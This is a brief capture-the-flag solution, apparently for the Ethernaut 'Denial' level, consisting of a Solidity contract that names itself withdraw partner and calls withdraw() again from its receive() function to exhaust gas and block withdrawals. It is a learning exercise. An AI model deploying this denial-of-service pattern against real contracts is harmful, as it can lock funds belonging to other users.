# 20 - Denial

### Scripted Solution

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

interface IDenial {
    function setWithdrawPartner(address _partner) external;

    function withdraw() external;
}

contract DenialExploit {
    IDenial private _denialContract;

    /**
     * Constructor sets `Denial` contract and adds itself as a 'withdraw
     * partner'.
     */
    constructor(address denialContractAddress) {
        _denialContract = IDenial(denialContractAddress);

        _denialContract.setWithdrawPartner(address(this));
    }

    receive() external payable {
        _denialContract.withdraw();
    }
}
```
